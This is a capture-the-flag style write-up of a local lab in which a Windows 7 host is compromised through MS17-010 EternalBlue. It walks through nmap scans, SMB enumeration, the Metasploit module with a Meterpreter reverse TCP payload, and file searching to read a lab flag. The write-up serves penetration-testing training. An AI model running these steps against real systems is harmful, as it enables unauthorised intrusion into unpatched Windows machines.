# 🔴 RedHat

## Information

| Field | Value |
|--------|-------|
| Platform | Local Lab |
| Operating System | Windows 7 Professional x64 |
| Difficulty | Easy |
| Date | 2026-07-10 |

---

# Overview

The objective of this laboratory was to compromise a Windows 7 Professional host by identifying a vulnerable service, exploiting it and obtaining the final flag.

---

# Objectives

- Discover the target host
- Enumerate exposed services
- Identify potential attack vectors
- Obtain remote code execution
- Capture the flag

---

# Host Discovery

A host discovery scan was performed against the local network.

```bash
nmap -sn 192.168.1.0/24
```

A VirtualBox virtual machine was identified at:

```
192.168.1.8
```

---

# Port Scanning

```bash
nmap -Pn -sC -sV -O 192.168.1.8
```

Key findings:

- Windows 7 Professional Build 7600
- SMB (445)
- NetBIOS (139)
- SMBv1 Enabled

---

# SMB Enumeration

Several SMB enumeration techniques were performed.

Tools used:

- smbclient
- NetExec
- enum4linux-ng

Findings:

- Null Session allowed
- SMB Signing not required
- SMBv1 enabled
- No anonymous shares
- No users disclosed
- No groups disclosed

Although anonymous access was possible, no useful information was obtained.

---

# Vulnerability Verification

The MS17-010 vulnerability was verified using the Nmap NSE script.

```bash
nmap --script smb-vuln-ms17-010 -p445 192.168.1.8
```

Result:

```
VULNERABLE
MS17-010
```

---

# Exploitation

Metasploit was used to exploit the MS17-010 vulnerability.

Module:

```
exploit/windows/smb/ms17_010_eternalblue
```

Payload:

```
windows/x64/meterpreter/reverse_tcp
```

The exploit successfully established a Meterpreter session.

---

# Post Exploitation

After obtaining Meterpreter access, the target filesystem was searched for potential flag files.

```text
search -f *flag*
```

The following file was identified:

```
C:\Users\Cyberdark\Desktop\HACKED\Flag.txt
```

The file contents were displayed:

```text
cat C:\Users\Cyberdark\Desktop\HACKED\Flag.txt
```

---

# Flag

```
MS17_010_3t3rn41_blu3_pwn3d
```

---

# Tools Used

- Nmap
- smbclient
- NetExec
- enum4linux-ng
- Metasploit Framework
- Meterpreter

---

# Lessons Learned

- Perform proper reconnaissance before exploitation.
- SMB enumeration can reveal valuable information even without credentials.
- Always verify vulnerabilities before attempting exploitation.
- Understand why an exploit is selected instead of simply executing it.
- Meterpreter provides a powerful post-exploitation environment for interacting with compromised hosts.

---

# MITRE ATT&CK

| Tactic | Technique |
|----------|----------|
| Reconnaissance | Active Scanning |
| Discovery | Network Service Scanning |
| Initial Access | Exploit Public-Facing Service |
| Execution | Exploitation for Client Execution |
| Command and Control | Meterpreter Reverse TCP |
| Collection | Data from Local System |


